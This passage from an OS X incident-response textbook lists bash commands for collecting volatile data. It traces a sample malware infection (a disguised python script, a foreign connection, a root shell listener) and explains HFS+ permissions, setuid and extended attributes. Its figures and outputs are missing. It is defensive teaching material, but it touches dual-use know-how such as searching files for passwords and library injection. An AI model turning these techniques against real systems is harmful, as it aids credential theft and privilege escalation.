manage OS X gatekeeper. The --status switch will tell you if gatekeeper is enabled.
bash –version
Since we will be using bash to collect system data, we should know what ver-
sion the system is using.
WHO INFO
whoami
Returns what user the script is being executed as. In our case, this should return 
root.
who
Displays which users are currently logged onto the system.
w
Displays which users are logged in and what process they are currently running.
finger (-m)
Supplies additional information about a specified user including their home 
directory, shell, idle time, and more. The -m instructs finger to use exact match-
ing. Good for when you want to run it on a specific user.
last (<user>)
Shows you the last login times of each user. When run with no arguments, last 
will show you all logins from all users. If you’re only curious about a specific 
user you can include them as an argument.

Network Information
27
screen (-ls) (-x)
Screen is a tool that lets you run multiple terminal instances under one ter-
minal session. Running screen by itself will open a new screen instance. This 
screen instance will continue to exist once you close the terminal window. You 
can reattach to it later by getting the screen instance name with the -ls switch 
and connecting to it with the -x switch. Many users will screen long running 
processes in the background and come back to them later.
USER INFORMATION
id
Print a user’s group names and id numbers. If no user is specified, the com-
mand will return info for the user who executed it.
groups
Print the groups that a specified user belongs to. If no user is specified, the 
command will return info for the user who executed it.
printenv
Print the environment variables for the user who executed the command
dscl . -ls /Users
The dscl command has many different uses. We will be using it specifically to 
list all users on a system using “dscl . ls /Users”. User accounts setup for dae-
mons will begin with an “_”. Alternatively, you could cat the /etc/passwd file
PROCESS INFORMATION
ps (aux)
Displays processes running on the system. Using the “aux” options we can get 
some very verbose information about running processes.
a – display processes from all users
u – displays owners of each process
x – also show processes not attached to a terminal
NETWORK INFORMATION
ifconfig
A classic command for getting the system’s internal IP address and other net-
work device info.

CHAPTER 3: 
Bash Commands
28
netstat (-ru) (-an)
A well-known command to list open ports and connection information. The 
-ru options will display the routing tables. -an will show the state of all routing 
tables and show network addresses as numbers instead of symbols (slightly 
more presentable).
lsof (-p <pid>) (-i)
Although this command is generally used for investigating files that a process 
has open, it can also be used to list network connections sorted by process. You 
can use the -p option to inspect all the opened files of a specified pid. You can 
also use the -i option to map processes to open ports. Many analysts prefer this 
over the netstat output.
smbutil (statshares -a)
A tool used to view smb shares that have been mounted to the hard drive.
arp (-a)
Just like in windows, when OS X communicates with another system on the lo-
cal network, that system’s IP address is stored inside the ARP (address resolution 
protocol) table. This table will contain IPs that the system has contacted along 
with their MAC addresses. Use the -a option to display all arp table entries.
security dump-trust-settings (-s) (-d)
Dump certificates used by the system. -s will display trusted system certs and -d 
will display trusted admin certs.
networksetup
Networksetup allows you to set or view a number of network options includ-
ing ftp proxies, web proxies, firewall options, and many more. Most of the 
following options will require you to specify a network service. The network 
service could be Wi-Fi, an internet connection via Bluetooth, USB Ethernet, 
Thunderbolt, or otherwise. You can get a list of the network services available 
with the following command:
networksetup -listallnetworkservices
networksetup – listallhardwareports—which will reveal a bit more 
information than the – listallnetworkservices switch.
This will return all the hardware connections available. I will be using Wi-Fi as an 
example since a lot of MacBooks rely strongly on Wi-Fi for their communication 

Additional Commands
29
with the Internet (make note that before OS X 10.7 this service name was called 
“airport” rather than Wi-Fi).
networksetup – getwebproxy Wi-Fi – displays web proxy info
networksetup – getautoproxyurl Wi-Fi – displays url of web proxy if one 
has been setup
networksetup – getftpproxy Wi-Fi – displays ftp proxy info
SYSTEM STARTUP
The following items are basic commands to collect information regarding sys-
tem startup and scheduling. In Chapter 5 we will take a look at how to prop-
erly collect these artifacts, but for now these commands are also mentioned in 
this chapter for reference.
launchctl list
Lists currently loaded launch agents and daemons. The output contains the pro-
cess id started as a result of the loaded property list. If the process is not currently 
running it displays the last exit code of that process. The third column is the 
property list label.
crontab -l
Lists the scheduled cron tasks for the logged in user.
atq
Dumps the “at” tasks for the logged in user.
kextstat
Returns a list of loaded KEXT files also known as drivers. KEXT files should 
commonly be installed in the /System/Library/Extensions directory.
ADDITIONAL COMMANDS
mdfind (-name) (-onlyin)
mdfind lets you use OS X spotlight from the terminal. Spotlight is the in-
dexed search functionality built into the operating system. You can use 
it to search for files containing keywords incredibly quickly. For instance  
“mdfind password” will return all files that contain the word password 
demonstrating that it can be a powerful tool for both attackers and analysts. 
The -name switch looks for specified keywords inside file names rather than 
file contents. The -onlyin option allows you to limit your search to a specific 
directory.

CHAPTER 3: 
Bash Commands
30
sysctl (-a)
sysctl lets you to set or get the kernel state allowing you to view a number of 
different configuration values for kernel level tools and programs. The -a op-
tion will print all values.
history
The history command reveals previous commands typed into the shell. Note 
that this is not actually a standalone binary. It is a built in bash command
security list-keychains
Lists keychains. By default most systems should have a login.keychain and a 
system.keychain. It doesn’t hurt to see if any additional keychains have been 
created. See the “Privilege Escalation and Passwords” chapter for more infor-
mation on the OS X keychains.
nvram
nvram allows you to view system boot arguments and firmware variables.
du -h
A relatively quick way to get the disk usage statistics of the hard drive.
The -h option will use human readable output. Converts the bytes into a more 
useable size.
diskutil list
List the information of connected hard drives.
MISCELLANEOUS
codesign (-d) (-vv)
Codesign can be used to create or display developer signatures for binaries on 
the system. This can be incredibly useful when writing scripts to collect suspi-
cious files. The -d option will display code information and -vv will be extra 
verbose in printing information regarding the signature.
file
A popular command that will return the known file type of a specified file.
md5
Running the md5 command will return the md5 hash of a specified file.

Miscellaneous
31
tcpdump
A well-known packet capture tool that can be used to monitor network traffic. 
We will not use this command in our scripts, but it could be run in the back-
ground while collecting other artifacts.
printenv
Print bash environment variables.
nettop (-m)
A unique tool that displays process network usage in a “top-like” format. -m al-
lows you to specify a mode to monitor. You can select tcp, udp, or route which 
monitors the routing table. This command isn’t super useful for scripting, but may 
come in handy when performing hands on analysis on a compromised system.
DTrace
DTrace is an incredibly powerful program used for debugging various items 
on the system. It was originally designed for the Solaris operating system but 
has made its way to a handful of other Unix-based platforms. Dtrace has its 
own scriptable language known as d script. D script can be used for analysis 
of both application and kernel level activity. Unfortunately, DTrace usage has 
now been limited on OS X starting with El Capitan due to the implementation 
of “System Integrity Protection”. We will not be diving deep into the dtrace 
language, but we will use a script found in the book “DTrace: Dynamic Tracing 
in Oracle Solaris, Mac OS X, and FreeBSD by Brendan Gregg and Jim Mauro, 
Prentice Hall 2011”. In this book, the authors demonstrate a d script called so-
connect_mac.d. This script tracks outbound tcp connections as they are made 
in real time. Since our incident response collection script will take a while to 
run, we can let the soconnect_mac.d script run in the background in attempts 
to find any odd beaconing from suspicious processes. The d script looks as fol-
lows (Fig. 3.1):
FIGURE 3.1

CHAPTER 3: 
Bash Commands
32

Bash Environment Variables
33
BASH ENVIRONMENT VARIABLES
While collecting volatile data for each user, you may also chose to collect user 
environment variables. It is possible that an attacker could chose to override 
or make additions to these variables to benefit him. Following are some of the 
more common variables.
TERM_PROGRAM
The user’s default terminal
TERM
terminal type (xterm-256color)
TMPDIR
Apps will use this directory to store temporary files
TERM_PROGRAM_VERSION
Program Version of the $TERM_PROGRAM being used
TERM_SESSION_ID
Unique identifier for the current terminal session
USER
The user who has the terminal open
SSH_AUTH_SOCK
ssh-agent unix domain socket used for key authentication
PATH
A list of directories that hold executables. These executables can be called from the 
terminal without referencing their entire file path.
PWD
The present working directory or where the user is currently browsed to in the 
terminal
XPC_FLAGS
Undocumented Apple environment variable related to XPC
LANG
encoding used in terminal
XPC_SERVICE_NAME
Set by launchd to indicate the name of the XPC service running or 0 if no XPC 
service is running
SHLVL
Increases every time an instance of Bash is started inside of it’s own shell. (How 
many times has Bash opened Bash)
HOME
Holds the user’s home directory
LOGNAME
The name of user who logged in
SECURITYSESSIONID
Used by securityd. Its use is undocumented
OLDPWD
Stores the previous directory the user was in.
DYLD_INSERT_LIBRARIES
Should never be set by default. Allows users to insert their own libraries into ad-
dress space. The OS X equivalent to Linux’s LD_PRELOAD.

CHAPTER 3: 
Bash Commands
34
SCRIPTING THE COLLECTION
Using some of the aforementioned commands we can compile a Bash script 
designed to collect volatile data. How you wish to group your output is com-
pletely up to you. Some analysts may prefer to create a different file for every 
single command. Others might prefer to put all output into a single file. This 
book will use a mixed format. For instance, commands used to collect system 
settings will go in a file called sysInfo.txt. Commands used to collect user data 
will go in a file called userInfo.txt. Finally, command output that we need to 
access frequently, such as running processes and open ports will be placed in 
their own text file. I find that when performing analysis from the command 
line, this proves the most useful method. Remember to use good comment-
ing especially when working with a team. Here is an image displaying what 
updates need to be made to our collection tool (Fig. 3.2).
As you can see, we’re going to update the collect.sh script we started in the last 
chapter. The only other addition we need is a folder called “scripts”. We will 
put all future scripts required by our collection framework in here. We will 
place the soconnect d script in this folder that will allow us to track outbound 
tcp connections in the background while we collect our data. Now we will add 
the following lines to our collect.sh script accordingly (Fig. 3.3).
FIGURE 3.2

Scripting the Collection
35
FIGURE 3.3

CHAPTER 3: 
Bash Commands
36
ANALYSIS
Now that we have collected the command output from our suspect system, 
we can begin to look for malicious behavior on this system. Over the course 
of this book we will slowly begin putting all the pieces of the puzzle to-
gether as we collect new data. I’ll start by looking at the available files I’ve 
collected.

Analysis
37
It’s good practice to first take a look inside the system info file.

CHAPTER 3: 
Bash Commands
38
There are a few things worth noting in the systemInfo.txt file. First is that the 
system is running 10.9 which is OS X Mavericks. There’s nothing wrong with 
running an old version of OS X. In fact, some people may prefer a version they 
have become familiar with and know works for them.
It’s also good to know this system’s IP address before moving forward.
Here we see that the system we’re dealing with has an internal IP of 192.168.0.14. 
I’ll move on to take a look at the different users logged on to the system.
This shows me that at the time this command was executed, there was only 
one user logged in to the system. This user was named “mike” and he was 
logged in twice. Once via the console, which in this case is the operating sys-
tem graphical user interface, and once via ttys000 which was the terminal we 
opened to run the incident response script. Next, I will take a look at the users 
including the ones who are not logged in. Remember that we collected all the 
users on the system including daemon users, which start with an underscore. 
If you are only interested in the physical users then skip the users names that 
begin with an underscore.

Analysis
39
This output of this dscl command shows us that the system has a handful of 
users. A few of these are actually built in. They are as follows:
j	 Daemon—The user reserved for use by system daemons.
j	 Guest—The guest account. An account made for guest users with very 
strict permissions.
j	 Nobody—This account comes standard with a Unix-based builds. 
Software may choose to execute processes as the “nobody” user when 
minimal permissions are required. This will ensure that if software is 
compromised, the attacker has very limited capabilities.
j	 root—You should already be familiar with this account. Root is the 
most privileged user. Attackers make it a goal to compromise this 
account.
This leaves two separate users. mike, and test. Let’s take a look at the output of 
the “last” command to see how frequently these users have logged in.
The “last” output shows that two users were recently active on this system. The 
mike user appears to login frequently at the keyboard. One of the most useful 

CHAPTER 3: 
Bash Commands
40
things about the “last” command is that it will also supply IP addresses from 
remote users who login over ssh. This is where it becomes important to know 
the details behind the system you’re analyzing. Is this someone’s personal lap-
top? Is it a shared system in a lab? Your analysis mindset should be affected 
by these questions. Company owned laptops do not generally have more than 
one main user unless the employee uses an admin account separate from a 
basic account. In our scenario the system we are analyzing is a personal com-
puter, so we shouldn’t expect to see many remote logins.
So far we haven’t seen any activity that sticks out as malicious. Next, I could 
dive right into running processes in hopes to find one that sticks out. How-
ever, since there are so many processes active on a standard OS X system it 
makes more sense to start by looking at network connections. Let’s take a 
look at some of the network data that we’ve captured. The output from the 
lsof command is a great place to start. I’ve only included the COMMAND, 
PID, USER, and NAME, columns for the purpose of making this output more 
readable.

Analysis
41
The lsof -i output can be incredibly “noisy” if the system is running a lot of 
cloud services, network related apps, or web browsers. Take your time and look 
carefully. The first thing that sticks out is that ssh is running on this system. We 
can’t assume this is malicious but it is certainly worth noting. What is more 
alarming is the connection to IP 211.77.5.37 made by python.
The lsof output reveals the process id (PID) responsible for this connection is 
2513. We can search for this PID inside our process information.
The result of our search tells us that process 2513 was created by running the 
command “python /Users/mike/Library/iTunesSupport”. This is a major red 
flag for a number of reasons.
j	 Python (commonly used for scripting) has no business interacting with 
iTunes software.
j	 The file is located in the user’s “Library” directory, which is reserved 
for personal settings and content used by applications. The ∼/Library 
folder is usually filled with directories. It’s rare to see a standalone file 
in there.
j	 The executed python script is labeled iTunesSupport. Malware authors 
often try to make their malware blend in with legitimate looking 
software names.
Now I’ll look for the same PID inside of the normal lsof output (rather than 
the lsof –i output). Remember, we ran this command earlier which allows us to 
see all the files that have been loaded by each process. I’ve used the awk com-
mand to clean up the output a little.

CHAPTER 3: 
Bash Commands
42
Searching for the PID inside of the lsof output reveals that python has loaded a 
number of libraries. Most of these appear to be standard python libraries, but 
they aren’t being loaded from the expected python locations. Instead they’re 
coming from “/Users/mike/Downloads/security_update.app/” At this point we 
can almost guarantee we’re dealing with malware. Let’s check to see if any other 
processes were executed in the same time window. We will once again turn to 
the “ps aux” output.
This reveals a shell script that was executed around the same time titled 
“iTunesBackup”. It’s located inside of a hidden folder called “backups”. File 
names executing from a hidden directory should also be considered red flags. 
Many OS X malware variants from the past have used hidden directories and 
file names as part of their tactic to stick around unnoticed. We now have two 
processes of interest.

Analysis
43
2513 – Python executing a file called iTunesSupport
2498 – Bash executing a file called iTunesBackup
Let’s take these processes and try to build a better idea of how they were cre-
ated. We will do this by following the process tree up the chain. Even though 
OS X does not have a standard “ptree” command like many Unix distributions, 
we can use the “ps axo” output to rebuild the process tree as it contains both 
process and parent process ids. The second column of our ps axo output is the 
process id and the third column is the parent process id. Let’s start by looking 
for the 2513 process id (iTunesSupport).
Here we see that process 2513 (python running iTunesSupport) has one child 
process which looks like an attempt to execute a privileged bash listener on 
port 1583. Before we start investigating that, let’s keep moving up the tree. 
Now we want to know what was responsible for executing this python script. 
So we will search for it’s parent process- 2498.
It comes as no surprise that the hidden iTunesBackup script is responsible for 
executing iTunesSupport. We have now confirmed that these two processes are 
definitely related, but let’s keep following the process tree upward.
Here we can see that the app we saw earlier called security_update.app is re-
sponsible for this entire process tree. The fact that it was executed from the 
downloads directory also tells us it was likely downloaded from the internet. 
So far it looks the mike user has been compromised. Let’s follow the process 
tree one more step up.

CHAPTER 3: 
Bash Commands
44
FIGURE 3.4
The parent process of security_update.app is pid 158. This is the launchd pro-
cess which is expected. We’ll talk more on launchd in the system startup and 
scheduling chapter.
Using the information we’ve discovered, here is what our malware tree looks 
like so far (Fig. 3.4).

Analysis
45
Now that we’ve walked up the tree, we also have to make sure we go down the 
tree. The last command in this tree that we saw was an attempt to create a root 
shell connecting to the localhost on port 1583. Let’s look for a child process 
under 3296.
…and again for 3298
and again for 3299.

CHAPTER 3: 
Bash Commands
46
Let’s take a look at the updated process tree (Fig. 3.5).
FIGURE 3.5

Conclusion
47
This tree shows us that the attacker was indeed able to gain access to a root 
shell after compromising the mike account. Over the next chapters we will 
continue to analyze the attacker’s actions as well as how this malware oper-
ates. We will also frequently reference the volatile data we collected in this 
chapter.
CONCLUSION
In this chapter we’ve demonstrated how to discover malware by simply using 
the commands that are already available on OS X. Although malware will not 
always be as obvious as this particular sample, you should be able to find clues 
that malicious activity is taking place. The amount of clues you find will also 
greatly depend on which phase of the kill chain you managed to collect your 
forensic artifacts.
Yara rule of indicators discovered in this chapter.

49
OS X Incident Response. http://dx.doi.org/10.1016/B978-0-12-804456-8.00001-7
Copyright © 2016 Elsevier Inc. All rights reserved.
File System
CHAPTER 4
INTRODUCTION
Like with all operating systems, understanding the different pieces of the file 
system is important for a thorough analysis. In this chapter we will discuss 
file system components, permissions, and attributes as well as the locations of 
various file-based artifacts. Our goal is to understand what malicious tools the 
attacker may have written to the system as well as what files he may have ac-
cessed while he was on it. We will also discuss how to pull a listing of all files 
on the hard drive and how to most productively analyze the output.
BRIEF HISTORY
The modern day OS X system operates using the Hierarchical File System Plus 
(HFS+). Long ago before HFS+ existed, the earliest version of Apple’s file sys-
tem was called the “Macintosh File System” (MFS). In the 1980s Apple then 
released an updated version with more features and called it HFS (HFS Stan-
dard). Finally, starting with Mac OS 8.1 the HFS+ file system was released. 
HFS+ was an improvement on HFS Standard allowing many needed additions 
such as support for larger files and 32-bit allocation mapping tables. Apple 
continues to add new features to HFS+ making it more reliable such as journal-
ing which was added in OS X 10.3. Like any other file system HFS+ is designed 
to handle difficult low level tasks so that the user can go about storing data in a 
seamless fashion. Rather than taking a deep dive into the specifics of the HFS+ 
file system, we will take a high level approach that allows us to focus on the 
details necessary to perform the incident response tasks at hand.
HFS+ OVERVIEW
HFS+ is the native file system on OS X systems at the time this book was writ-
ten. Apple has another variant called HFSX which is the default file system on 
iOS devices and operates in a very similar manner. When installing OS X for 

CHAPTER 4: 
File System
50
the first time you are given the choice between HFS+ and HFSX. Most users 
go with the default which is HFS+. One of the major differences is that HFSX 
is case-sensitive whereas HFS+ is case-insensitive. This means that /tmp/file.
txt and /tmp/FILE.txt cannot both exist on an HFS+ filesystem. Both of these 
names will reference the same file. HFS+ and HFSX both offer tight integration 
with the Finder application which allows for unique tagging and advanced 
searches across the file system.
The HFS+ file system, like any file system, is made up of an incredible number 
of components. Many of these components are outside the scope of this book. 
You do not need to master the low level workings in order to perform analysis, 
but having an understanding of how the data is stored could help you come up 
with additional scripts and ideas. The following items are the most important 
to understand.
Volume Header
Holds the file system version (H+ for HFS+ or HS for HFSX), block size, and 
details on where to locate the Catalog file among other things.
Allocation File
The allocation file’s main purpose is to keep track of which blocks of the hard 
drive are available for use.
Catalog File
The Catalog File is a critical component of the HFS+ file system. It holds a re-
cord for every file stored on the system. This record includes metadata such as 
timestamps, basic Unix Permissions, the owner id, group id, and Finder prop-
erties. Like many other components of HFS+, this data is stored in the format 
of a B-Tree. A B-Tree is the data structure that holds a sorted record of each file 
on the volume and is updated as files are added and deleted from the system.
Attributes B-Tree
The Attributes B-Tree stores file extended attributes. Among these extended 
attributes are most notably access control lists (ACLs) which allow for more 
customizable permissions rather than the standard Unix inode permissions of 
User, Group, and Other. Have you ever copied a file or folder from your Mac 
to a flash drive and then plugged that flash drive into a Windows system? If 
you have, odds are you’ve seen a file such as .rsrc that was copied along with it. 
The reason for this is because the file attributes from OS X don’t always trans-
late correctly over to Windows. This is why when copying a file from OS X to 
Windows you will end up with multiple files instead one. We’ll get further into 
extended attributes a bit later in the chapter.

Inodes, Timestamps, Permissions, and Ownership
51
INODES, TIMESTAMPS, PERMISSIONS, AND OWNERSHIP
Inodes
Every file saved on your hard drive will have an inode number stored with it. 
Inodes are data structures on the file system that store the most basic infor-
mation about files. This includes but is not limited to the inode number, file 
owner, the group of the file owner, basic permissions, number of links, file 
size, modified timestamp, accessed timestamp, and changed timestamp. You 
can view a number of these details using the “ls” command or you can use the 
preferred “stat” command. Take the following example:
In the aforementioned example I use stat -x to display the data in one of its 
most readable formats. This shows a handful of attributes about the file includ-
ing its inode number. Make sure to note that an inode does not actually con-
tain the file data. Instead it holds a file’s attributes and points to the location 
of the data on disk.
Timestamps
Every file on the system stores four different timestamps. At a low level, these 
timestamps are stored in the number of seconds since January 1, 1970 UTC. 
Attackers do have the ability to manually modify these timestamps (with the 
exception of the changed timestamp) which doesn’t work in our favor, but 
many attackers won’t bother doing so.
Timestamps for Files
j	 Accessed—The time in which the file was last accessed. Meaning opened 
or executed in some way.
j	 Modified—The time in which the file was last modified, for example, 
opening a file in a text editor and adding characters.
j	 Changed—This timestamp will get updated under a few different 
circumstances. First, this timestamp will be updated whenever a file is 
modified. Second, it will be updated if the file name changes. Third, it 
will be updated if metadata such as permissions or extended attributes 

CHAPTER 4: 
File System
52
are modified. Note that the accessed and modified timestamps will not 
be affected by metadata being updated or the file name being changed.
j	 Birth—Although not supported by the kernel until OS X 10.5 Leopard, 
the birth timestamp is the best indicator of when the file was written to 
disk. This timestamp should not update unless done manually by an 
attacker.
Timestamps for Folders
j	 Accessed—Contents of the directory were listed. Example: Running “ls”
j	 Modified—Contents of folder changed. Example: a file was updated, 
added, or removed from the folder
j	 Changed—Just like the changed timestamp for files, this is updated 
when metadata is changed or the folder is modified.
j	 Birth—Tells when the folder was written to disk. Never gets updated 
unless done manually.
Permissions
As mentioned already OS X adopts the standard Unix permissions to deter-
mine what users can do with files. Understanding permissions will come in 
handy particularly when an attacker has gained access to a system but has 
failed to compromise the root account.
The permissions stored inside the inode are in order of the file owner, the file 
owner’s group, and all other users. In the aforementioned example with file1.txt, 
the permissions attribute shows “-rwxrw-r--“. Users can have three different types 
of permissions. Read, Write, and Execute. The most popular way to view these per-
missions is by using ls -l. Let’s break these permissions down really quick (Fig. 4.1).
The first entry (a dash in this case) is not actually a permission. It represents the 
file type. We’ll look at the various file types in the next section. The next class rep-
resents owner permissions. In this example, the user has read, write, and execute 
permissions. Everybody who is in the owner’s group has read and write permis-
sions, and everyone else can only read the file. This is a simplistic and effec-
tive approach to permissions. Permissions can also be viewed in octal notation 
FIGURE 4.1

Inodes, Timestamps, Permissions, and Ownership
53
which is what we will be using when we collect file information later. Calculating 
octal notation is simple. Each permission type holds a numerical value.
read = 4
write = 2
execute = 1
To convert file permissions to octal format, you simply take each class and add 
these numerical values together. In the aforementioned example the owner has 
read, write, and execute permissions. This makes for a sum of seven. So instead 
of printing out “rwx” octal notation would simply show a seven (Fig. 4.2).
The aforementioned image shows us that “-rwxrw-r--” permissions in octal no-
tation show as “764”
Special File Permissions
Outside of the standard read, write, and execute permissions there are addi-
tional permission bits that you may encounter. These bits are called setuid and 
setgid. By marking a file as setuid, the file owner can allow other users to execute 
that file on their behalf. In other words, when any user executes the setuid file 
it will actually be executed as the owner instead. Likewise, using setgid allows 
other users to execute a file on behalf of the group it belongs to. If this sounds 
risky, it’s because it is. Setuid and setgid binaries can be incredibly useful when 
used correctly, but they have often led to privilege escalation vulnerabilities in 
the past. The setuid bit can be set with chmod either by using the “s” character 
or numerically by adding the number four to the front of the octal permissions.
Notice that in the aforementioned output the owners executable bit (x) has 
been swapped out with a setuid bit (s). Note that it is possible for a file to be 
FIGURE 4.2

CHAPTER 4: 
File System
54
marked as setuid but not set as executable. If this is the case, the ls output will 
contain a capital S rather than lowercase.
Directory Permissions
Just like files, directories also hold a read, write, and execute permissions with 
the same user, group, and “other” classes. However, the permissions operate a 
little differently. Execute permissions allow a user to enter a directory (using cd 
command). Read permissions allow a user to see the files within it (using the 
ls command). Write permissions allow a user to delete and create files within a 
directory as well as modify the attributes of the file, but only if the execute bit 
is set along with it. If the write bit is enabled but the executable bit is not, very 
little can be accomplished.
Sticky Bit
The sticky bit is a special permission that can be used on directories. It tells 
the system that the only user allowed to delete the directory is the directory 
owner (or root). This means that even if I’ve given other users full permissions 
to my directory, they will not be able to delete it. The sticky bit can be set using 
chmod by either adding the “t” bit or numerically using the number one in 
front of the octal permissions.
The aforementioned output shows that the final execute bit has been replaced 
with a “t” implying that the sticky bit has been set for this folder.
EXTENDED ATTRIBUTES
Aside from the basic Unix attributes that are adopted with the creation of every 
file, the HFS+ file system also allows for extended attributes. Extended attributes 
can be used to store additional information about a file. One very basic example 
is the author of a document. You’ve probably seen author tags stored inside 
the metadata of a Microsoft Word document before. Attributes like this can be 

Extended Attributes
55
added to a file in key/value pairs. You can add any key/value pair that you want, 
but it’s up to the software or operating system as to which ones they use. Most 
extended attributes can be viewed and modified using the xattr command. To 
view the different attribute names, you can just use xattr with no switches.
Let’s take this a step further and use the -l switch to view both the attributes 
and their values.
This is an incredibly neat feature built into OS X and the HFS+ file system. Here 
we see that the attribute “kMDItemWhereFroms” holds the value of the loca-
tion from which it was downloaded. The second attribute com.apple.quaran-
tine tells us Google Chrome was related. These tags are added in real time and 
handled in the background by the operating system. The quarantine is applied 
to all files that are downloaded through web browsers including executables. 
When you launch an executable OS X will check to see if it holds the “quaran-
tined” attribute. If it does, you will receive a warning popup upon executing.
You can use the mdfind command to search for files with these tags. For ex-
ample, to get a list of files that have been downloaded from Google Images I 
could use something like this.
Make note that Spotlight only indexes kMDItem attributes. Therefore, we are 
limited to the same tags when using mdfind.

CHAPTER 4: 
File System
56
Finally, to view more metadata entries including all kMDItem attributes you 
can use mdls. The mdls output displays metadata compiled from Spotlight 
processing in addition to the file’s extended attributes.
Access Control Lists
A good example of a system-based extended attribute would be an ACL. Every 
file stores this in the attribute called com.apple.systemSecurity. Many users are 
familiar with ACLs on Window’s NTFS file system and this is essentially the 
same concept. In fact, ACLs between OS X and Windows are compatible over 
Active Directory or SMB sharing. This allows for a more customizable approach 
letting you assign privileges to specific users rather than having to worry about 
them belonging to your group. Likewise, you can also edit ACL data to give 

Extended Attributes
57
access to specific groups. You can view ACLs using the GUI by right clicking a 
file and selecting “Get Info (Fig. 4.3).”
If a user has modified the file’s ACL, then a “+” will be displayed at the end of 
the permissions.
You can then use “ls -le” to display those ACL rules.
FIGURE 4.3

CHAPTER 4: 
File System
58
If a file has additional extended attributes associated with it as well as a modi-
fied ACL the “ls -l” output will show a “@” at the end of the permissions in-
stead of a “+”.
Keep in mind that ACL’s work on top of the standard Unix permissions. En-
abling an ACL does not disable the basic permissions.
Resource Forks
Not to be confused with a process fork, a resource fork is another example of 
an extended attribute. It was a concept first put together by Apple and later 
adopted by Microsoft. Although on Windows you might be more familiar with 
the term “Alternate Data Stream”. As if there aren’t enough places to store ad-
ditional metadata on HFS+, we now have forks available. Forks allow you to 
attach files together. Apple’s original idea for this was to allow you to include 
more customizations to your data. For instance, you could attach an icon to 
your file and that icon would show up any time the file was opened on another 
OS X system.
If a file has a resource fork attached to it, you can access it by appending “/..
namedfork/rsrc” to the filename.
Apple seems to be trying to deprecate the resource fork since there are other 
ways to accomplish its original tasks, but take a look at the following example:
This shows an example of adding the words “This is a resource fork test” into 
the resource fork of a file named hello.txt. Now if you take a look at the file’s 
extended attributes you’ll notice that the contents of the resource fork are 
included as an extended attribute.

File Types and Traits
59
FILE TYPES AND TRAITS
Earlier we mentioned that the first bit inside the ls -l output holds the file type. 
During your analysis it’s important to understand the different file types and 
how they work.
Notice that in the aforementioned data, the first line of output starts with a 
“-” and the second line starts with a “d”. This tells me that the first file entitled 
“data” is just a plain file. Whether that be an mp3, doc, docx, txt, or some other 
format, it is some type of file. “myDir2” on the other hand starts with the letter 
d which means it is a directory. The majority of files on your system are made 
up of these two file types.
OS X uses the traditional Unix file types. Here are the different characters in the 
“ls -l” output and what they stand for.
“-” → Normal File
A normal file as demonstrated.
“d” → Directory
A directory as demonstrated.
“l” → Link
A link is simply a file that is linked to another location on the hard drive. 
When you open that link, you will really be opening the file it is connected 
to. Think of it somewhat like a shortcut used in Windows. When viewing the 
“ls -l” output, link files will begin with an “l” and also display the file that  
the link is connected to. Take a look at the /tmp directory. You’ll notice that 
it’s really just a soft link to /private/tmp. There are two different types of 
links. Hard links and soft links. Hard links are connected directly to another 
file’s inode as where soft links connect to a file path. This means that hard 
links can be linked to directories or files from another device, separate drive, 
or network share as where soft links can only be linked to other files on the 
hard drive.

CHAPTER 4: 
File System
60
“b” → block device
Block files give the Unix platform access to devices that are plugged into the 
system. Block devices allow for access in fixed chunks. Your hard drives are a 
good example of a block device as they need to be read in blocks of data.
“c” → character device
A character device is similar to a block device but rather than operating in 
blocks, it operates in streams. Character devices interact with the kernel to per-
form read and write activity. A good example of this would be a bluetooth 
device that reads and writes data in streams.
“p” → pipe
A pipe shares a lot of commonalities with a character device. The big differ-
ence is that they speak directly with a process instead of the kernel making it 
another method of interprocess communication.
“s” → socket
These file types will commonly be network sockets and/or inter-process com-
munication sockets (IPCs). IPC sockets bind to a file path rather than a net-
work address. For example, the syslog allows other processes to communicate 
with it over Unix domain sockets. Its socket file can be found at /private/var/
run/syslog
For scripting purposes, make sure to note that you can use the find command 
to search for any of these files types. To find all links under the home directory 
you could use the following find command:

OS X Specific File Extensions
61
OS X SPECIFIC FILE EXTENSIONS
Here are some quick descriptions of popular file extensions you may run into 
while using the OS X operating system.
.dmg
Apple Disk Image files are most commonly seen with software installers. The 
user can mount and access the data inside of these files. Dmgs can be format-
ted with a number of different file systems including HFS, HFS+, and FAT.
.kext
A kext bundle is the OS X version of a driver. A bundle isn’t a file. It’s actually 
a directory which you can browse the contents of. Kext bundles have a specific 
directory structure that is required for it to operate correctly.
.plist
Also known as a property list, these files store XML content at their most ba-
sic level. Property lists are used everywhere on OS X. Most commonly they 
are used for storing settings. Some property lists are stored in “binary” format 
which can easily be converted back into xml on the fly as we will discover later. 
These files are covered in depth in the system startup and scheduling chapter.
.app
Most people are familiar with Apple applications. These are programs made up 
of multiple files and folders. Applications are another example of a structured 
directory that you can browse the contents of.
.dylib
Dylibs or dynamic libraries are the closest equivalent to a Windows DLL file. 
It’s a file that contains shared code that can be imported by a program.
.pkg
.pkg files are the same as xar (eXtensible ARchive format) archives with a dif-
ferent file extension and content hierarchy. pkgutil is built into the command 
line for the handling of these files types. The “installer” command can be used 
to install contents of.pkg files.
Mach-O binary
The binary format used on OS X. What is particularly interesting about Mach-
O binaries is that they can support multiarchitecture. Take a look at the sftp 
executable using the “file” command (from a Mavericks system).

CHAPTER 4: 
File System
62
Popular Scripting Languages Found on OS X
.sh – Bash script
.py – Python
.pl – Perl
.rb – Ruby
.node – Javascript
.scpt – Apple script
.scptd – Apple script bundle file
.lua – Lua script
.php – PHP script
.tcl – Tool Command Language script
FILE HIERARCHY LAYOUT
Many of the locations at the root of the hard drive will look familiar to long 
time Unix users. We will briefly touch on which folders are stored at the root 
of the hard drive and what they contain. Understanding the drive layout will 
give the analyst a better idea of where to look for certain files during an in-
vestigation, as well as help the analyst identify when a suspicious file exists 
somewhere it shouldn’t.
/Applications
When installing apps, they should be installed in this directory. All users on the 
system will be able to access applications installed here.
/Library
This directory holds many subdirectories by default. Most of which are related 
to application preferences, caches, and logs. A Library directory exists in both 
the root directory and every user’s directory where similar data is stored on a 
per user basis.
/System
Files required to make OS X run go in here. The majority of files in this folder 
should be Apple specific and not third party.

File Hierarchy Layout
63
/Users
This directory is the equivalent of the Linux /home directory. Every user on the 
system will have their own directory stored here for their personal files and 
folders. IE: Desktop, Documents, Downloads, Movies, Music, etc.
/Volumes
Any drives mounted on your system will show up in this folder. Even your root 
hard drive will show up here as a soft link pointed at “/”.
/.vol
This is a truly unique directory related to the virtual file system that exists on 
top of HFS+ (or HFS Standard). A record of the files on the hard drive is stored 
here by their inode numbers rather than file names. This allows you to interact 
with files via their inode number. Take the following example:
The first number the stat command reveals is the id number of the volume 
where the file exists. The second number is the file’s inode. We can now interact 
